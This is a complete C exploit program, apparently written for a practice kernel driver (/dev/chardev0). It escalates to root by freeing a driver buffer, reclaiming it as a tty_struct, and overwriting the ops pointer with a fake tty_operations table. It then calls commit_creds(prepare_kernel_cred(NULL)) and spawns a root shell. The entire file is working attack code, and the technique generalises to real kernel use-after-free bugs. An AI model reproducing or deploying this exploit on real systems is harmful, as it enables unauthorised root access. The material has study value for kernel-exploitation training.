//gcc -static -o exploit-3 exploit-3.c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>
#include "chardev.h"

#define DEVICE_FILE_NAME "/dev/chardev0"   

void *(*prepare_kernel_cred)(void *) ;
int (*commit_creds)(void *) ;
void *fake_tty_operations[30];
 
void get_root()
{
    commit_creds(prepare_kernel_cred(NULL));
}

void *kallsym_getaddr(char *name)
{
    FILE *fp;
    void *addr;
    char sym[512];
  
    fp = fopen("/proc/kallsyms", "r");
    while (fscanf(fp, "%p %*c %512s\n", &addr, sym) > 0) {
        if (strcmp(sym, name) == 0) {
            break;
        }else{
            addr = NULL;
        }
    }
    fclose(fp);
    return addr;
}
  
int main(){
    int i = 0, j;

    //Find the address of "prepare_kernel_cred()"
    prepare_kernel_cred = kallsym_getaddr("prepare_kernel_cred");
    if(prepare_kernel_cred == 0)
    {
        printf("failed to get prepare_kernel_cred address\n");
        return 0;
    }
 
    //Find the address of "commit_creds()"
    commit_creds = kallsym_getaddr("commit_creds");
    if(commit_creds == 0)
    {
        printf("failed to get commit_creds address\n");
        return 0;
    }
 
    printf("prepare_kernel_cred = %p\n", prepare_kernel_cred);
    printf("commit_creds = %p\n", commit_creds);

    //Set the fake "tty_operations" structure. 
    for(i = 0; i < 30; i++)
    {
	fake_tty_operations[i] = 0; 
    }

    //Save the address of get_root() function in "tty_operations.unlocked_ioctl".
    fake_tty_operations[12] = (size_t)get_root;

    int fd1;
    if ((fd1 = open(DEVICE_FILE_NAME, O_RDWR)) < 0){
        printf("Cannot open /dev/chardev0. Try again later.\n");
    }

    ioctl(fd1, KMALLOC, 0x2e0);
    ioctl(fd1, KFREE);

    int fd_tty;
    if ((fd_tty = open("/dev/ptmx", O_RDWR|O_NOCTTY)) < 0){
        printf("Cannot open /dev/chardev0. Try again later.\n");
    }

    //Overwrite the address of the fake "file_operations" in the "tty_struct.ops".
    size_t fake_tty_struct[4] = {0};
    read(fd1, fake_tty_struct, 32);
    fake_tty_struct[3] = (size_t)fake_tty_operations;
    write(fd1,fake_tty_struct, 32);

    //Call the ioctl(ioctl -> unlocked_ioctl -> get_root)
    ioctl(fd_tty, 0, 0);

    printf("getuid() = %d\n", getuid());
    execl("/bin/sh", "sh", NULL);  

    if (close(fd1) != 0){
        printf("Cannot close.\n");
    }

    if (close(fd_tty) != 0){
        printf("Cannot close.\n");
    }
    return 0;
}
